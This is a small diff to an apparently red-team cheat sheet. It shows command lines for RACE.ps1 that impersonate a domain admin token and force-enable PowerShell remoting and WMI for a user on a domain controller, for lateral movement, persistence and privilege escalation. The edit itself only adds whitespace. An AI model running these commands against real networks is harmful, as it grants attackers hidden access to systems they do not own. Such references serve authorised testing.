@@ -80,7 +80,8 @@ powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; host
 [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
 ```
 powershell-import --> RACE.ps1
-make_token AD\Admin password --> This tool will require Admin privileges on the remote system
+make_token AD\Admin password --> This tool will require Admin privileges on the remote system  
+
 powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com --> Force enable PS remoting for the specific user
 powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com --> Force enable WMI for the specific user
 ```
